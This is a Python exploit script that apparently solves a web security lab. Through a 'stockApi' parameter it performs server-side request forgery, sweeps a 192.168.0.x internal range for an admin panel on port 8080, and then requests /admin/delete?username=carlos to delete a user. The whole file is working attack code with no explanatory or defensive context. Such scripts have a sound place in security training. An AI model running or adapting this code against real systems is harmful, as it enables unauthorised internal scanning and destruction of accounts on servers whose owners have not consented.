import requests
import sys
import urllib3
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def check_admin_hostname(base_url):
    check_stock_path = "/product/stock"
    admin_ip_address = ''
    for i in range(1, 256):
        hostname = f'http://192.168.0.{i}:8080/admin'
        params = {'stockApi': hostname}
        response = requests.post(
            urljoin(base_url, check_stock_path), data=params, verify=False, proxies=proxies)

        if response.status_code == 200:
            admin_ip_address = f'192.168.0.{i}'
            break

    if not admin_ip_address:
        print("(-) Could not find admin hostname.")

    return admin_ip_address


def delete_user(base_url, admin_ip_address):
    delete_user_url_ssrf_payload = f'http://{admin_ip_address}:8080/admin/delete?username=carlos'
    check_stock_path = '/product/stock'
    params = {'stockApi': delete_user_url_ssrf_payload}
    response = requests.post(
        urljoin(base_url, check_stock_path), data=params, verify=False, proxies=proxies)

    # Check if the user was deleted
    check_admin_url_ssrf_payload = f'http://{admin_ip_address}:8080/admin'
    params2 = {'stockApi': check_admin_url_ssrf_payload}
    response = requests.post(urljoin(
        base_url, check_stock_path), data=params2, verify=False, proxies=proxies)

    if 'User deleted successfully' in response.text:
        print("(+) Successfully deleted Carlos user.")
    else:
        print("(-) Exploit was unsuccessful.")


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} www.example.com")
        sys.exit(1)

    url = sys.argv[1]
    print("(+) Finding admin hostname...")
    admin_ip_address = check_admin_hostname(url)

    if admin_ip_address:
        print(f"(+) Found the admin IP address: {admin_ip_address}")
        print("(+) Deleting Carlos user...")
        delete_user(url, admin_ip_address)
    else:
        print("(-) Admin IP address not found, aborting.")


if __name__ == "__main__":
    main()
